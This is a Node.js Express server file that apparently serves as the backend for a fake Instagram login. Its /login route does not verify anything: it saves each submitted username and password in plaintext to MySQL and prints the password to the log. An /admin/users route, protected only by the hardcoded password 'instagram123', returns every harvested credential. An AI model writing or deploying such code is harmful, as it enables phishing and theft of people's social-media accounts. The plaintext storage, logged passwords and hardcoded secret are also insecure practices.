require('dotenv').config();
const express = require('express');
const mysql = require('mysql2');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
app.use(cors());
app.use(bodyParser.json());


const db = mysql.createConnection({
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  database: process.env.DB_NAME,
});

db.connect((err) => {
  if (err) {
    console.error('Database connection failed: ' + err.message);
  } else {
    console.log('Connected to MySQL Database');
  }
});


app.post('/login', (req, res) => {
  const { username, password } = req.body;

  console.log('Received Login Request: ', username, password); 

  
  const insertUserQuery =
    'INSERT INTO users (username, password) VALUES (?, ?)';

  db.query(insertUserQuery, [username, password], (insertErr) => {
    if (insertErr) {
      console.error('Error Inserting User:', insertErr);
      return res.status(500).json({ error: insertErr.message });
    }
    console.log('User data saved:', username);
    return res.json({ message: 'User data saved successfully' });
  });
});



app.get("/admin/users", (req, res) => {
  const adminPassword = req.headers["admin-password"]; 

  
  if (adminPassword !== "instagram123") {
    return res.status(403).json({ error: "Unauthorized Access!" });
  }

  
  const query = "SELECT id, username, password FROM users"; 

  db.query(query, (err, results) => {
    if (err) {
      console.error("Error fetching users:", err);
      return res.status(500).json({ error: err.message });
    }
    res.json({ users: results });
  });
});

app.get("/", (req, res) => {
  res.send("hello instagram")
})



app.listen(5000, () => {
  console.log('Server running on port 5000');
});
